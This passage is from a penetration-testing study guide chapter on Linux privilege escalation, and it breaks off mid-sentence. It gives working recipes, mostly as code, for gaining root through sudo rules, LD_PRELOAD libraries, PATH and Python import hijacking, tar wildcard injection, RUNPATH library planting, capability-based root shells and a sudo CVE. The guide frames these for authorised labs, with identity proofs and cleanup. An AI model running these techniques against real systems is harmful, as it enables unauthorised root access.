# 05 · Linux privilege escalation

Use this chapter only on an authorised lab or assessment host. Start after obtaining a shell in
[§03](03-shells-and-payloads.md). Prefer one-shot identity proof, restore what you touched, and do
not add users, keys, sudoers rules, recurring jobs, or other persistence.

Placeholders: `TARGET_IP`, `ATTACKER_IP`, `TARGET_PORT`, `CALLBACK_PORT`, `<user>`, `<path>`,
`<binary>`, and `<service>`.

**Card order:** context → check → run → success → cleanup.

**Jump:** [fast pass](#51-fast-pass) · [credentials/tools](#52-credentials-source-and-staged-tools) ·
[sudo](#53-sudo-and-delegated-execution) · [SUID/capabilities](#54-suid-sgid-and-file-capabilities) ·
[jobs/services](#55-privileged-scripts-cron-systemd-and-local-services) ·
[PATH](#56-path-and-relative-command-lookup) · [wildcards](#57-wildcard-and-argument-injection) ·
[loaders](#58-loaders-rpath-runpath-and-shared-objects) · [Python](#59-python-import-hijacking) ·
[groups/devices](#510-privileged-groups-devices-logs-and-tmux) ·
[containers](#511-containers-lxd-docker-and-kubernetes) · [NFS](#512-nfs-no_root_squash) ·
[applications](#513-application-specific-consumers) · [CVE gate](#514-kernel-and-platform-cves-last-resort) ·
[routes/corrections](#515-routes-stops-and-corrected-old-notes) ·
[verify/cleanup](#516-verify-and-clean-up).

## 5.1 Fast pass

### Identity, host, shell, and environment

```bash
id
whoami
groups
hostname
uname -a
cat /proc/version
cat /etc/os-release 2>/dev/null
cat /etc/issue 2>/dev/null
getconf LONG_BIT 2>/dev/null
printf 'shell=%s\nPATH=%s\n' "$SHELL" "$PATH"
env | sort
command -v bash sh python3 perl ruby gcc cc make
```

Keep the original four-way host check (`hostname`, `uname -a`, `/proc/version`, `/etc/issue`): one
value may be customised or stale. Use the combined result for role, distribution, architecture,
kernel and compiler hypotheses.

### Users, sudo, processes, and sockets

```bash
getent passwd
cat /etc/passwd
getent group
sudo -n -l 2>/dev/null || sudo -l

ps
ps -A
ps axjf
ps auxwwf
ps -eo user,pid,ppid,lstart,cmd --sort=user

ip -brief address
ip route
ss -lntup
ss -antup
```

Legacy fallbacks remain useful on small images:

```bash
ifconfig -a 2>/dev/null
route -n 2>/dev/null
netstat -lntup 2>/dev/null
netstat -ano 2>/dev/null   # Linux: -o shows timers; use -p for PID/program when permitted
```

New interfaces or routes go to [§07](07-pivoting-and-tunneling.md). A loopback-only listener stays
in scope here only when a higher-identity local service consumes controlled input.

### Filesystems, mounts, jobs, and service surfaces

```bash
ls -la
lsblk -f
findmnt -R /
mount
df -hT
cat /etc/fstab 2>/dev/null

cat /etc/crontab 2>/dev/null
ls -la /etc/cron.d /etc/cron.* 2>/dev/null
systemctl list-timers --all 2>/dev/null
systemctl list-units --type=service --state=running 2>/dev/null
systemctl list-unit-files --type=service 2>/dev/null

getcap -r / 2>/dev/null
find / -xdev -type f -perm -4000 -ls 2>/dev/null
find / -xdev -type f -perm -2000 -ls 2>/dev/null
find / -xdev -type f \( -perm -4000 -o -perm -2000 \) -ls 2>/dev/null
```

`-perm -4000` means “SUID is set”; `-perm -2000` means “SGID is set”. `-perm -6000` would require
both bits, so it is not a replacement for the parenthesised OR expression.

### High-yield `find` recipes

```bash
# Current user can write these paths.
find / -xdev -type f -writable -ls 2>/dev/null
find / -xdev -type d -writable -ls 2>/dev/null

# World-writable directories/files (the sticky bit and consumer still matter).
find / -xdev -type d -perm -0002 -ls 2>/dev/null
find / -xdev -type f -perm -0002 -ls 2>/dev/null

# Root-owned scripts and unit files writable by the current user.
find / -xdev -user root -type f -writable \
  \( -name '*.sh' -o -name '*.py' -o -name '*.service' -o -name '*.timer' \) -ls 2>/dev/null

# Recently changed files and common application/config locations.
find / -xdev -type f -mmin -60 -ls 2>/dev/null
find /etc /opt /srv /var/www -xdev -type f -readable \
  \( -name '*.conf' -o -name '*.ini' -o -name '*.yml' -o -name '*.yaml' -o -name '*.env' \) \
  -ls 2>/dev/null

# Targeted name/owner/size examples retained from the private quick notes.
find /home -type f -name 'flag1.txt' 2>/dev/null
find /home -user '<user>' -ls 2>/dev/null
find / -xdev -type f -size +100M -ls 2>/dev/null
find / -xdev -type f -cmin -60 -ls 2>/dev/null
```

Do not confuse “writable” with “world-writable”: `-writable` is evaluated for the current identity;
`-perm -0002` tests the other-write bit. Repeat a search on a relevant mount only after checking its
`nosuid`, `noexec`, ownership and namespace context.

### High-yield order

1. `sudo -l`, unusual groups/sockets, set-ID files, file capabilities.
2. Root processes, cron/timers, writable scripts/configs, relative commands, writable parents.
3. Local credentials, source/config, loopback services, Git history.
4. Containers, raw devices, NFS, loaders/imports, application-specific consumers.
5. Vendor-qualified kernel/platform CVEs only after the configuration paths are exhausted.

## 5.2 Credentials, source, and staged tools

### Local credential and source leads

```bash
history
ls -la ~/.ssh 2>/dev/null
find ~ /opt /srv /var/www -xdev -type f -readable \
  \( -name '.*history' -o -name '*.env' -o -name 'wp-config.php' -o -name 'settings.py' \
     -o -name 'config.php' -o -name 'application.properties' \) -ls 2>/dev/null

# WordPress-shaped memory cue: locate the file, then inspect only the relevant definitions.
find /var/www -xdev -type f -name 'wp-config.php' -print 2>/dev/null
grep -nE "DB_(NAME|USER|PASSWORD|HOST)" /var/www/<site>/wp-config.php 2>/dev/null

# Process command lines when procfs permissions allow it.
for p in /proc/[0-9]*/cmdline; do
  [ -r "$p" ] && { printf '%s: ' "$p"; tr '\0' ' ' < "$p"; echo; }
done 2>/dev/null

# Repository history can expose removed configuration; never copy recovered secrets into this repo.
git -C <repo> status --short 2>/dev/null
git -C <repo> log --oneline --all --decorate -n 30 2>/dev/null
git -C <repo> show <commit>:<path> 2>/dev/null
```

Route candidate passwords/hashes to [§04](04-password-attacks.md), shell/key handling to
[§03](03-shells-and-payloads.md), and file movement to [§09](09-file-transfers.md). Record only the
location and purpose of a secret, never its value.

### `adm` and readable logs

```bash
id
find /var/log -xdev -type f -readable -ls 2>/dev/null
grep -RniE 'pass(word)?|secret|token|api[_-]?key|credential|sudo|cron' \
  /var/log 2>/dev/null | head -n 100
journalctl --no-pager -n 200 2>/dev/null
```

Membership in `adm` is a log-reading lead, not root by itself. Replace target-specific flag searches
with a narrow process or credential indicator and keep any discovered value private.

### Staged local helpers

Use a locally reviewed copy; do not download-and-execute from the target.

```bash
./linpeas.sh -a
./LinEnum.sh -t
./lse.sh -l 1
python3 ./linuxprivchecker.py
./pspy64 -pf -i 1000
./lynis audit system
./linux-exploit-suggester.sh
```

Every result is a lead. Re-run the underlying `stat`, `namei`, `getcap`, `sudo -l`, `readelf`,
`systemctl cat`, `findmnt`, or process command manually before treating it as a path.

## 5.3 sudo and delegated execution

### Read the exact rule

```bash
sudo -l
sudo -V | head
```

Example shape:

```text
(root) NOPASSWD: /usr/bin/nice /notes/*
(root) NOPASSWD: SETENV: /usr/bin/python3 /opt/app/report.py
Defaults: env_keep += "LD_PRELOAD"
```

Match the RunAs identity, absolute binary, arguments, wildcards, negations, environment policy and
password requirement. A binary name in GTFOBins is not enough when the actual sudoers arguments are
constrained.

### Exact-binary quick checks

#### Git help pager

**Context:** sudo permits Git with argument freedom and its help opens an interactive pager.

```bash
sudo /usr/bin/git -p help config
# In the pager, prove the identity first:
!/usr/bin/id
# Authorised lab handoff only:
!/bin/sh
```

Success is the RunAs identity from `id`. Exit the pager and shell; no file cleanup is required.

**Correction:** `sudo PAGER=... git ...` is rejected unless the sudo environment rule permits that
assignment. The pager route above does not depend on forcing `PAGER`.

#### APT Pre-Invoke

**Context:** the exact sudo rule permits `apt-get` options, including a Pre-Invoke hook.

```bash
sudo /usr/bin/apt-get \
  -o 'APT::Update::Pre-Invoke::=/usr/bin/id' update
```

Success is the RunAs identity before the update. This command can contact configured repositories
and change package metadata; do not use it as the default proof where network/state changes are out
of scope.

#### sudo path glob with `nice`

**Context:** a rule such as `/usr/bin/nice /notes/*` matches a path containing `../` on the tested
sudo build and the downstream command resolves it outside `/notes`.

```bash
cat > /tmp/oscp-nice-proof.sh <<'EOF'
#!/bin/sh
/usr/bin/id
EOF
chmod 700 /tmp/oscp-nice-proof.sh

sudo /usr/bin/nice /notes/../tmp/oscp-nice-proof.sh
rm -f /tmp/oscp-nice-proof.sh
```

Success is the RunAs identity. Stop if the exact rule, wildcard placement, canonicalisation or sudo
version does not match; do not broaden the command by guesswork.

#### GNU tar allowed directly by sudo

```bash
sudo /usr/bin/tar -cf /dev/null /dev/null \
  --checkpoint=1 --checkpoint-action=exec=/usr/bin/id
```

This is argument control on a directly allowed GNU tar binary. The cron/wildcard form is a different
consumer and is retained in [§5.7](#57-wildcard-and-argument-injection).

#### tcpdump postrotate helper

**Context:** sudo permits the exact `tcpdump` arguments needed for `-G`, `-W`, `-z`, and `-Z`.

```bash
PROOF_DIR=$(mktemp -d /tmp/oscp-tcpdump.XXXXXX)
cat > "$PROOF_DIR/proof.sh" <<EOF
#!/bin/sh
/usr/bin/id > '$PROOF_DIR/id.txt'
EOF
chmod 700 "$PROOF_DIR/proof.sh"

sudo /usr/sbin/tcpdump -ln -i lo -w "$PROOF_DIR/capture-%s.pcap" \
  -G 1 -W 1 -z "$PROOF_DIR/proof.sh" -Z root
cat "$PROOF_DIR/id.txt"
rm -rf -- "$PROOF_DIR"
```

Success is the recorded RunAs identity. If the rule fixes the interface, output, rotation, drop-user
or postrotate command, this card does not apply.

### `LD_PRELOAD` kept by sudo

**Context:** `sudo -l` shows `env_keep+=LD_PRELOAD` or `SETENV`, plus an exact allowed dynamically
linked command.

```c
// /tmp/oscp-preload.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) static void proof(void) {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/usr/bin/id");
}
```

```bash
gcc -fPIC -shared -o /tmp/oscp-preload.so /tmp/oscp-preload.c
sudo LD_PRELOAD=/tmp/oscp-preload.so <exact-allowed-command>
rm -f /tmp/oscp-preload.c /tmp/oscp-preload.so
```

Success is an identity line emitted before the allowed command continues. The older note that built
a shared object containing only `main()` is invalid: preloading a library does not call `main()`.

<details>
<summary>Authorised-lab shell handoff</summary>

After the identity proof, the familiar lab variant replaces the `system()` line with:

```c
system("/bin/sh -p");
```

Do not combine the `_init`/`-nostartfiles` pattern with the constructor pattern above. Use one
complete implementation and remove the source/shared object immediately after the test.

</details>

### Version- and policy-gated sudo issues

#### CVE-2019-14287 (`-u#-1`)

**Context:** the vendor sudo build is affected and the rule permits a non-root RunAs set such as
`(ALL,!root)` with the target command.

```bash
sudo -V | head -n 1
sudo -u#-1 /usr/bin/id
```

Success is effective UID 0. A modern/patched build or a different RunAs rule is a stop condition.

#### `sudoedit` and Baron Samedit

```bash
sudo -l
sudo -V | head -n 1
command -v sudoedit
```

Keep CVE-2021-3156 (Baron Samedit), sudoedit symlink/race issues, and other version-specific paths
behind the [CVE gate](#514-kernel-and-platform-cves-last-resort). Qualify the installed vendor
package/backport and exact policy before staging reviewed source in a disposable lab.

## 5.4 SUID, SGID, and file capabilities

### Enumerate and inspect the unusual entry

```bash
find / -xdev -type f -perm -4000 -ls 2>/dev/null
find / -xdev -type f -perm -2000 -ls 2>/dev/null
find / -xdev -type f \( -perm -4000 -o -perm -2000 \) -ls 2>/dev/null
getcap -r / 2>/dev/null

stat <binary>
file <binary>
namei -l <binary>
strings -a <binary> | less
objdump -p <binary> | sed -n '1,120p'
readelf -d <binary>
```

Compare unusual binaries with the distribution baseline and the exact GTFOBins function. Treat
old interactive Nmap, Vim with embedded Python, or a set-ID interpreter as build/feature-specific;
the filename alone is not the prerequisite.

### Custom root-SUID binary calls bare `thm`

The original lab fixture was equivalent to:

```c
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setgid(0);
    setuid(0);
    return system("thm");
}
```

The low-privilege user does **not** compile and mark their own copy SUID; the vulnerable binary must
already be root-owned and set-ID. Confirm the bare command, then control an earlier PATH entry:

```bash
stat /opt/lab/path_exp
strings -a /opt/lab/path_exp | grep -F thm

WORK=$(mktemp -d /tmp/oscp-path.XXXXXX)
cat > "$WORK/thm" <<'EOF'
#!/bin/sh
/usr/bin/id
EOF
chmod 700 "$WORK/thm"

PATH="$WORK:/usr/bin:/bin" /opt/lab/path_exp
rm -f "$WORK/thm"
rmdir "$WORK"
```

Success is effective UID 0. If the program uses `/usr/bin/thm`, resets PATH, drops privilege, runs
with `nosuid`, or the mount ignores set-ID, stop.

### Custom `status` binary calls relative `service`

```bash
stat /usr/local/bin/status
strings -a /usr/local/bin/status | grep -E 'service|ssh|status'

WORK=$(mktemp -d /tmp/oscp-service.XXXXXX)
cat > "$WORK/service" <<'EOF'
#!/bin/sh
/usr/bin/id
EOF
chmod 700 "$WORK/service"
PATH="$WORK:/usr/bin:/bin" /usr/local/bin/status
rm -f "$WORK/service"
rmdir "$WORK"
```

**Correction:** older notes alternated between `/usr/bin/status` and `/usr/bin/suid-path`; use the
actual discovered binary. Do not use a helper that drops a persistent SUID shell.

### `cap_setuid`: Python and Vim variants

```bash
getcap <python-binary> <vim-binary> 2>/dev/null

# Exact Python binary must have cap_setuid effective.
<python-binary> -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'

# Exact Vim build must have cap_setuid and +python3.
<vim-binary> --version | grep -E '^\+python3|^\+python'
<vim-binary> -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'
<vim-binary> -E -c ':py3 import os; os.setuid(0); os.system("/usr/bin/id")' -c ':q!'
```

Success is effective UID 0. These commands are not applicable when the capability is absent from
the exact executable, only permitted in a file's extended attributes listing, or removed by the
execution environment.

### Capability-enabled tar as a protected-read primitive

```bash
getcap /home/<user>/tar
/home/<user>/tar -tf /var/backups/<protected-archive>
/home/<user>/tar -xOf /var/backups/<protected-archive> <member-path>

# Familiar original variant: tar opens the protected archive and the decompressor echoes raw bytes.
/home/<user>/tar xf /var/backups/<protected-archive> \
  -I '/bin/sh -c "cat 1>&2"'
```

This normally demonstrates `cap_dac_read_search`/protected read, not root code execution. Keep any
recovered credential private and route its validation to [§04](04-password-attacks.md).

### High-risk capability stop

`cap_dac_override` on an editor can make protected files writable. Do not prove it by editing
`/etc/passwd`, `/etc/shadow`, sudoers, PAM, or SSH configuration. Record the capability and exact
protected path as a critical finding; use a disposable lab file if a write proof is explicitly
required.

**Correction:** the old Vim example set `cap_net_bind_service` but later claimed
`cap_dac_override`; those are unrelated capabilities.

## 5.5 Privileged scripts, cron, systemd, and local services

### Map the consumer before touching anything

```bash
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.d /etc/cron.daily /etc/cron.* 2>/dev/null
systemctl list-timers --all 2>/dev/null
systemctl cat <unit> 2>/dev/null
systemctl show <unit> -p User -p Group -p ExecStart -p WorkingDirectory \
  -p EnvironmentFiles -p FragmentPath -p DropInPaths 2>/dev/null
./pspy64 -pf -i 1000

# World-writable and root-owned-writable scripts/units.
find / -xdev -path /proc -prune -o -type f -perm -o+w -ls 2>/dev/null
find / -xdev -user root -type f -writable \
  \( -name '*.sh' -o -name '*.service' -o -name '*.timer' \) -ls 2>/dev/null
```

Record the exact executable, parent directory, sourced files, PATH, working directory,
wildcard, and normal trigger interval before acting. A writable script is not proof until a
higher-identity consumer actually runs it.

### Writable root cron script (discover → pspy → trigger → restore)

**Context:** a world-writable script such as `/dmz-backups/backup.sh` is executed on a schedule
by root.

```bash
ls -la /dmz-backups/backup.sh
./pspy64 -pf -i 1000                 # confirm UID 0 runs it and the interval

cp -p /dmz-backups/backup.sh /tmp/oscp-backup.orig
printf '%s\n' '/usr/bin/id > /tmp/oscp-cron.id 2>&1' >> /dmz-backups/backup.sh
# Wait for one normal scheduled activation.
cat /tmp/oscp-cron.id

cp -p /tmp/oscp-backup.orig /dmz-backups/backup.sh   # restore exact bytes
rm -f /tmp/oscp-backup.orig /tmp/oscp-cron.id
```

Success is the cron identity in `oscp-cron.id`. Back up and restore the exact original script;
do not leave the appended line, add a reverse shell, or `chmod 777` the file. Stop if the job
runs an absolute-pathed copy elsewhere or the file is not actually consumed.

### Stale cron entry referencing a missing script

**Context:** a root cron entry still calls a script that was deleted from a directory you can
write.

```bash
grep -RIn -- '<missing-script>' /etc/crontab /etc/cron.d /etc/cron.* 2>/dev/null
namei -l <missing-script-path>
test ! -e <missing-script-path>

cat > <missing-script-path> <<'EOF'
#!/bin/sh
/usr/bin/id > /tmp/oscp-cron.id
EOF
chmod 0755 <missing-script-path>
# Wait for one normal activation.
cat /tmp/oscp-cron.id
rm -f <missing-script-path> /tmp/oscp-cron.id
```

Success is the cron identity. **Correction:** the old note's `chmod 777` "in case the cron job
is not running" is wrong troubleshooting; use a minimal `0755` mode and confirm the schedule
instead.

### sudo script feeds input into `eval`

**Context:** `sudo -l` allows a script such as `/opt/NewComponent/feedback.sh` whose body runs
`eval "echo $feedback"`.

```bash
sudo -l
sed -n '1,80p' /opt/NewComponent/feedback.sh

printf '%s\n' 'x; /usr/bin/id > /tmp/oscp-eval.id' | sudo /opt/NewComponent/feedback.sh
cat /tmp/oscp-eval.id
rm -f /tmp/oscp-eval.id
```

Success is the RunAs identity from the injected command. **Correction:** the original note
escalated this to writing a root cron line into `/etc/crontab`; a one-shot identity marker
proves the same flaw without adding persistence. Stop if quoting/validation keeps the
metacharacter as literal data.

### systemd timer → service → produced artifact

**Context:** `sudo -l` permits `systemctl start <unit>.timer`; its service unit writes a binary
such as `/opt/xxd`.

```bash
sudo -l
systemctl cat <unit>.timer <unit>.service
systemctl show <unit>.service -p User -p Group -p ExecStart
stat /opt/xxd 2>/dev/null
getcap /opt/xxd 2>/dev/null
```

Inspect the produced artifact's owner, mode, and capability, then match its exact GTFOBins
function for one identity proof. Starting a system unit is high-impact: confirm the normal
trigger and restore prior unit state afterwards. The artifact runs as whatever identity the
service uses, not automatically root.

### Root PHP built-in server on loopback with writable docroot

**Context:** a root process runs `php -S 127.0.0.1:<port> -t <docroot>` and the document root is
writable.

```bash
ps -eo user,pid,args | grep '[p]hp -S'
ss -ltnp 2>/dev/null | grep '127.0.0.1:<port>'
namei -l <docroot>

PROOF=<docroot>/oscp-$RANDOM.php
printf '%s\n' '<?php passthru("/usr/bin/id"); ?>' > "$PROOF"
curl -fsS "http://127.0.0.1:<port>/$(basename "$PROOF")"
rm -f "$PROOF"
```

Success is the identity of the PHP process. The loopback `curl` is acceptable here because a
privileged local service is already proven. Stop if PHP is served as text or the docroot is not
writable.

### Writable Apache config plus permitted restart

**Context:** `sudo -l` permits `systemctl restart apache2` and `apache2.conf` is writable.

```bash
sudo -l
stat /etc/apache2/apache2.conf
grep -nE '^[[:space:]]*(User|Group)[[:space:]]' /etc/apache2/apache2.conf
cp -p /etc/apache2/apache2.conf /tmp/oscp-apache.orig

# Set User/Group to the target account in the config, then:
apache2ctl configtest
sudo systemctl restart apache2
# Request a PHP `id` probe under the web root (as in the loopback card), then restore:
cp -p /tmp/oscp-apache.orig /etc/apache2/apache2.conf
sudo systemctl restart apache2
rm -f /tmp/oscp-apache.orig
```

Success is the configured worker identity, **not** automatically root. **Correction:** the file
is `apache2.conf`, not `apach2.config`. Back up the config, `configtest` before restart, and
restore the original identity and service state afterwards.

## 5.6 PATH and relative command lookup

### Precondition

PATH hijacking needs a higher-identity process that runs a **bare** command name and searches a
directory you can write before the real binary. An interactive `export PATH=...` in your shell
does not prove that cron, systemd, or a sudo/SUID consumer uses that PATH.

```bash
printf '%s\n' "$PATH" | tr ':' '\n'
namei -l <each-writable-path-dir>
strings -a <privileged-binary> | grep -nE '(^|/)(tar|cp|mv|service|systemctl|sh)( |$)'
# On a safe, non-set-ID invocation only:
strace -f -e trace=execve <consumer> 2>&1 | grep exec
```

The custom root-SUID `thm` and `status`→`service` binaries are the SUID form of this bug and are
handled in [§5.4](#54-suid-sgid-and-file-capabilities).

### `conncheck`-style privileged binary calls a bare child

**Context:** a privileged program (e.g. `conncheck`) calls a child command such as
`whoami`/`service` by name.

```bash
pwd
command -v conncheck
strings -a "$(command -v conncheck)" | grep -nE 'whoami|service|ssh'

WORK=$(mktemp -d /tmp/oscp-path.XXXXXX)
cat > "$WORK/<bare-child>" <<'EOF'
#!/bin/sh
/usr/bin/id > /tmp/oscp-conncheck.id
EOF
chmod 700 "$WORK/<bare-child>"
PATH="$WORK:$PATH" conncheck
cat /tmp/oscp-conncheck.id
rm -rf -- "$WORK" /tmp/oscp-conncheck.id
```

Success is the consumer's identity. **Correction:** the old note jumped straight to
`PATH=.:$PATH`; first confirm the exact bare child, and use a private proof directory rather than
a shared `.`/`/tmp` shell.

### `popen("whoami")` in a custom program

Same mechanism when a set-ID or root-run C program calls `popen("whoami", ...)`:

```bash
WORK=$(mktemp -d /tmp/oscp-popen.XXXXXX)
printf '%s\n' '#!/bin/sh' '/usr/bin/id > /tmp/oscp-popen.id' > "$WORK/whoami"
chmod 700 "$WORK/whoami"
PATH="$WORK:$PATH" <privileged-binary>
cat /tmp/oscp-popen.id
rm -rf -- "$WORK" /tmp/oscp-popen.id
```

### Root cron job calls bare `tar` from a writable PATH element

**Context:** a root cron script sets `PATH="/home/<user>/app:$PATH"` then runs bare `tar` (or
`cp`/`service`). The cron job's PATH, not your interactive one, controls resolution.

```bash
cat <backup-script>              # confirm bare `tar` and the prepended writable dir
grep -RIn -- '<backup-script>' /etc/crontab /etc/cron.* 2>/dev/null
./pspy64 -pf -i 1000
namei -l <writable-earlier-dir>

FAKE=<writable-earlier-dir>/tar
test ! -e "$FAKE"
cat > "$FAKE" <<'EOF'
#!/bin/sh
[ -e /tmp/oscp-crontar.id ] || /usr/bin/id > /tmp/oscp-crontar.id
exec /usr/bin/tar "$@"
EOF
chmod 0755 "$FAKE"
# Wait for one normal cron activation.
cat /tmp/oscp-crontar.id
rm -f "$FAKE" /tmp/oscp-crontar.id
```

Success is the cron identity; the wrapper passes the original arguments to the real
`/usr/bin/tar` so the job still succeeds. **Stop** if the script uses an absolute `tar` path, a
trusted PATH, or a directory where you cannot place and clean the helper safely.

## 5.7 Wildcard and argument injection

### Option-like filename intuition (`cat`/`tar`)

A wildcard (`*`) expands filenames in the working directory into a command's argument list. A
file named like an option is then parsed as an option.

```bash
WORK=$(mktemp -d /tmp/oscp-argv.XXXXXX); cd "$WORK"
printf 'this_is_file1\n' > file1
printf 'this_is_file2\n' > ./--help
cat *              # the crafted name is parsed as --help
cat -- ./--help    # `--` ends option parsing and reads the file
cd / && rm -rf -- "$WORK"
```

The privileged consumer must run a shell that expands `*` in a directory you can write. Stop when
it uses `--`, a fixed file list, a trusted directory, or no glob.

### GNU tar checkpoint via a root backup/cron job

**Context:** a scheduled root job runs `tar cf <archive> *` from a directory you can write (the
classic `backup.sh`).

```bash
grep -RIn -- '<backup-script>' /etc/crontab /etc/cron.* 2>/dev/null
readlink -f "$(command -v tar)"; tar --version | head -n1   # confirm GNU tar
cd <writable-glob-dir>

printf '%s\n' '#!/bin/sh' '/usr/bin/id > /tmp/oscp-tar.id' > oscp.sh
chmod 700 oscp.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh oscp.sh'
# Wait for the already-observed job, then:
cat /tmp/oscp-tar.id
rm -f -- '--checkpoint=1' '--checkpoint-action=exec=sh oscp.sh' oscp.sh /tmp/oscp-tar.id
```

Success is the job identity. **Correction:** the original helper appended a sudoers rule or a
reverse shell; replace that with the one-shot `id` marker. Remove every crafted filename by exact
name.

### Direct sudo tar (different consumer)

**Context:** `sudo -l` allows `tar` directly with argument freedom.

```bash
sudo -l
sudo /usr/bin/tar -cf /dev/null /dev/null \
  --checkpoint=1 --checkpoint-action=exec=/usr/bin/id
```

This is argument control on an allowed GNU tar, distinct from the cron/wildcard job above (also
linked from [§5.3](#53-sudo-and-delegated-execution)). Stop on fixed arguments, a different
RunAs, or non-GNU tar.

### Non-GNU tar external compressor, and the BusyBox stop

**Context:** bsdtar/libarchive lacks `--checkpoint` but may accept `--use-compress-program`/`-I`.

```bash
TAR=$(command -v tar); readlink -f "$TAR"
"$TAR" --help 2>&1 | grep -E -- '--checkpoint|use-compress-program| -I '

# Only when the consumer's argument freedom and PATH are proven:
WORK=$(mktemp -d /tmp/oscp-tarI.XXXXXX)
printf '%s\n' '#!/bin/sh' '/usr/bin/id > /tmp/oscp-tarI.id' 'exec /bin/gzip -c' > "$WORK/comp"
chmod 700 "$WORK/comp"
sudo /usr/bin/tar -cf /dev/null -I "$WORK/comp" /dev/null
cat /tmp/oscp-tarI.id
rm -rf -- "$WORK" /tmp/oscp-tarI.id
```

**Correction:** the old fallback wrote a filename containing `/tmp/...`; a single
working-directory filename cannot contain `/`, so the compressor must be a slash-free name found
through a proven consumer PATH, or supplied as a real `-I` argument as above. **Stop:** BusyBox
tar on minimal images supports neither mechanism — return to SUID, sudo, capability, cron, NFS, or
vendor-qualified CVE vectors.

### Gated variants and invalid old notes

| Consumer | Crafted input | Required condition | Handling |
|---|---|---|---|
| `rsync` | `-e sh <helper>` filename | job runs rsync in **remote** mode and parses argv | conditional; local-to-local stops |
| `chown`/`chmod` | `--reference=<file>` | a fixed owner/mode does not already override it | conditional; rehearse on a disposable file, restore metadata |
| `7z`/`7za` | `@<listfile>` | list-file semantics + privileged-**read** consumer | privileged-read only, not generic Zip code exec |
| `scp` | `-oProxyCommand=<cmd>` filename | remote destination + implementation argv order | conditional, transport-dependent |

```text
Invalid as written — do not resurrect as LPE recipes:
- find:  quoted `find . -name '*.txt'` is evaluated by find; a crafted filename
         cannot inject `-exec` into it.
- git:   `git add --chmod=+x` changes the index mode only, not filesystem privilege.
- curl:  `-o /etc/passwd` cannot be a single cwd filename (a filename has no `/`).
- MySQL: `mysql < *.sql` is a privileged writable-input-file case (`\! id`), not
         filename-option injection, and multiple matches break the redirect.
- wget:  `--post-file=<secret>` is protected-read + outbound exfiltration -> excluded
         from the local core (see 5.15).
```

## 5.8 Loaders, RPATH, RUNPATH, and shared objects

### Quick triage

```bash
readelf -d <suid-binary> | grep -E 'NEEDED|RPATH|RUNPATH'
objdump -p <suid-binary> | grep -E 'NEEDED|R.*PATH'
# Prefer readelf/objdump; ldd may execute the target. On a safe copy only:
ldd <suid-binary>
```

### `payroll`: writable RUNPATH and a missing symbol

**Context:** a root-SUID binary has `RUNPATH=/development`, that directory is writable, and the
program needs a library symbol such as `dbquery`.

```bash
ls -la payroll                   # -rwsr-xr-x root root
readelf -d payroll | grep PATH   # RUNPATH: [/development]
ls -la /development              # world-writable

# Reveal the required symbol by dropping any stand-in library first.
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
./payroll                        # symbol lookup error: undefined symbol: dbquery
```

Build a library in the RUNPATH directory that defines the missing symbol and drops one identity
proof:

```c
// /tmp/oscp-lib.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void dbquery(void) { setuid(0); system("/usr/bin/id"); }
```

```bash
gcc -shared -fPIC -o /development/libshared.so /tmp/oscp-lib.c
./payroll                        # runs dbquery() with the binary's privilege

rm -f /development/libshared.so /tmp/oscp-lib.c   # remove the planted library
```

Success is effective UID 0 (or the file owner). Match the exact `SONAME`/library filename the
binary loads and preserve any real library you overwrite. For a lab shell,
`system("/bin/sh -p")` replaces the `id` line; the identity marker is the default proof.

## 5.9 Python import hijacking

**Precondition:** a higher-identity run of a specific interpreter imports a module you can
influence. Use the exact interpreter and file from the observed command; a naked `python3`/`pip3`
may point at another environment. A SUID bit on a `.py` script is **not** a reliable
privileged-interpreter mechanism.

### A — writable file inside the imported package

**Context:** `sudo /usr/bin/python3 /path/mem_status.py` imports `psutil`, and
`psutil/__init__.py` is writable.

```bash
sudo -l
grep -n 'import\|virtual_memory' /path/mem_status.py
PKG=$(/usr/bin/python3 -c 'import psutil,os;print(os.path.dirname(psutil.__file__))')
ls -l "$PKG/__init__.py"
cp -p "$PKG/__init__.py" /tmp/oscp-psutil.orig
```

Insert the proof **inside** `virtual_memory()` while keeping its return value intact:

```python
def virtual_memory():
    import os; os.system('/usr/bin/id > /tmp/oscp-py.id')
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    _TOTAL_PHYMEM = ret.total
    return ret            # unchanged: the caller still needs a valid object
```

```bash
sudo /usr/bin/python3 /path/mem_status.py
cat /tmp/oscp-py.id
cp -p /tmp/oscp-psutil.orig "$PKG/__init__.py"   # restore exact bytes
rm -f /tmp/oscp-psutil.orig /tmp/oscp-py.id
```

Success is UID 0. **Correction:** returning `None` from `virtual_memory()` breaks the consumer;
the injected code must not change the function's contract.

### B — earlier writable `sys.path` entry shadows the module

**Context:** a directory earlier in `sys.path` than the real package is writable, so a same-named
module there wins.

```bash
/usr/bin/python3 -c 'import sys;print("\n".join(sys.path))'
# Pick a writable directory that precedes psutil's location.
cat > <writable-earlier-dir>/psutil.py <<'EOF'
import os
def virtual_memory():
    os.system('/usr/bin/id > /tmp/oscp-py.id')
    class M: total = 1; available = 1
    return M()            # compatible attributes the caller reads
EOF
sudo /usr/bin/python3 /path/mem_status.py
cat /tmp/oscp-py.id
rm -f <writable-earlier-dir>/psutil.py /tmp/oscp-py.id
rm -rf <writable-earlier-dir>/__pycache__
```

Success is UID 0. Return an object exposing the attributes the caller uses (`total`,
`available`); remove the shadow module and its `__pycache__`.

### C — sudo `SETENV`/`PYTHONPATH`

**Context:** `sudo -l` shows `(ALL) SETENV: NOPASSWD: /usr/bin/python3` (or the script) and
permits `PYTHONPATH`.

```bash
sudo -l
mkdir -p /tmp/oscp-mod
printf 'import os\ndef virtual_memory():\n os.system("/usr/bin/id")\n' > /tmp/oscp-mod/psutil.py
sudo PYTHONPATH=/tmp/oscp-mod /usr/bin/python3 /path/mem_status.py
rm -rf /tmp/oscp-mod
```

**Correction:** if the sudo rule allows `/usr/bin/python3` with **arbitrary** arguments, that is
already a direct interpreter escape
